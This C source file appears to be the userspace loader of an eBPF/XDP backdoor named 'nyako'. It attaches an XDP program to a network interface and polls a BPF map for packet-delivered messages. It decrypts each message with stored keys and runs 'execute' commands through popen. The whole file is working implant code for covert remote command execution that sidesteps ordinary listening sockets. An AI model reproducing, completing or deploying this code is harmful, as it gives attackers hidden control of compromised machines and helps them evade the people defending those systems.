#include "nyako.h"

static int get_map_value(int fd, __u32 key, struct message_details *value)
{
  if ((bpf_map_lookup_elem(fd, &key, value)) != 0)
  {
    return -1;
  }

  return 0;
}

static int find_map_fd(const struct bpf_object *bpf_obj, const char *map_name)
{
  struct bpf_map *map;
  int map_fd = -1;

  map = bpf_object__find_map_by_name(bpf_obj, map_name);
  if (!map)
  {
    return map_fd;
  }

  map_fd = bpf_map__fd(map);
  return map_fd;
}

static void handle_message(struct message_details *message_details)
{
  FILE *cmd;
  unsigned char command[MESSAGE_BUF_SIZE];
  char cmd_output[MESSAGE_BUF_SIZE], buf[MESSAGE_BUF_SIZE];
  struct message message;
  // size_t n;

  // reset buffers
  memset(cmd_output, 0, sizeof(cmd_output));
  memset(buf, 0, sizeof(buf));

  // skip if no data
  if (strlen((const char *)message_details->message) == 0)
  {
    printf("empty message, skipping...\n");
    return;
  }

  parse_message(message_details->message, &message);
  if (decrypt(command, message.ciphertext, message.ciphertext_len, message.nonce, PRIVATE_KEY_PATH, PUBLIC_KEY_PATH) < 0)
  {
    return;
  }


  if (message.type == TYPE_EXECUTE_CMD)
  {
    // execute the command
    cmd = popen((char *)command, "r");
    if (cmd == NULL)
    {
      log_error("popen");
      return;
    }

    printf("%s\n", command);

    // collect command result
    // while ((n = fread(buf, sizeof(buf), 1, cmd) > 0))
    // {
    //   printf("TODO: implement command responses: %zu\n", n);
    // }

    pclose(cmd);
  }
  else
  {
    log_error("unsupported command");
    return;
  }

  return;
}

static void message_poll(int map_fd, int interval)
{
  struct message_details message_details = { 0 };
  struct message_details empty_message_details = { 0 };

  while (true)
  {
    for (int i = 0; i < MESSAGE_QUEQUE_SIZE; i++)
    {
      if (get_map_value(map_fd, i, &message_details) < 0)
      {
        fprintf(stderr, "ERROR: bpf_map_lookup_elem failed key:0x%X\n", i);
        continue;
      }

      handle_message(&message_details);

      if (bpf_map_update_elem(map_fd, &i, &empty_message_details, BPF_EXIST) != 0)
      {
        fprintf(stderr, "ERROR: bpf_map_update_elem failed key:0x%X\n", i);
        continue;
      }
    }

    sleep(interval);
  }
}

int main()
{
  struct bpf_object *bpf_obj;
  int message_queque_map_fd;
  int interval = 10;

  struct config cfg = {
    .xdp_flags = XDP_FLAGS_UPDATE_IF_NOEXIST | XDP_FLAGS_SKB_MODE,
    .ifindex = IFINDEX,
  };

  strncpy(cfg.filename, NYAKO_KERN_FILENAME, sizeof(cfg.filename));
  strncpy(cfg.progsec, NYAKO_KERN_PROGSEC, sizeof(cfg.progsec));

  if (!(bpf_obj = load_bpf_and_xdp_attach(&cfg)))
  {
    log_error("load_bpf_and_xdp_attach");
    return -1;
  }

  message_queque_map_fd = find_map_fd(bpf_obj, MESSAGE_QUEQUE_MAP_NAME);
  if (message_queque_map_fd < 0)
  {
    xdp_link_detach(cfg.ifindex, cfg.xdp_flags, 0);
    log_error("find_map_fd");
    return -1;
  }

  message_poll(message_queque_map_fd, interval);

  return 0;
}

